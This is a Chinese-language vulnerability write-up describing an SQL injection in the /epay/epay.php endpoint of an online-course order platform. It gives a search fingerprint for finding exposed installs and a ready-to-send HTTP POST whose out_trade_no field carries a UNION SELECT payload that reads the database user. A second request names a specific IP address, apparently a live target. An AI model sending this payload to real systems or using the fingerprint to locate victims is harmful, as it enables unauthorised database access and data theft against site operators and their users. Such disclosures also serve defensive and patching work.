# 网课交单平台epay存在SQL注入漏洞

# 一、漏洞简介
网课交单平台是一款和发卡网对接的网课代学平台，拥有聚合支付，论文编辑等功能，其后台的可用性及可靠性得到了使用者的认可。网课交单平台某接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 网课交单平台

# 三、资产测绘
```http
"/apisub.php"
```

![1718193605379-22758e9d-9d5a-41a0-ba54-3cb86c6a26c9.png](./img/pSqHXnKzl_2lNnxt/1718193605379-22758e9d-9d5a-41a0-ba54-3cb86c6a26c9-427126.png)

# 四、漏洞复现
```java
POST /epay/epay.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1

out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -
```

![1718193755161-d81335ad-f1dc-4afd-a512-cc764cbb611a.png](./img/pSqHXnKzl_2lNnxt/1718193755161-d81335ad-f1dc-4afd-a512-cc764cbb611a-504810.png)

```java
POST /epay/epay.php HTTP/1.1
Host: 101.33.219.180:89
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1

out_trade_no=1
```

![1718193897061-a7e073aa-236a-42d0-a753-5aae192ddcc1.png](./img/pSqHXnKzl_2lNnxt/1718193897061-a7e073aa-236a-42d0-a753-5aae192ddcc1-738243.png)



> 更新: 2024-06-17 09:30:05  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/na3widtrnccyuruh>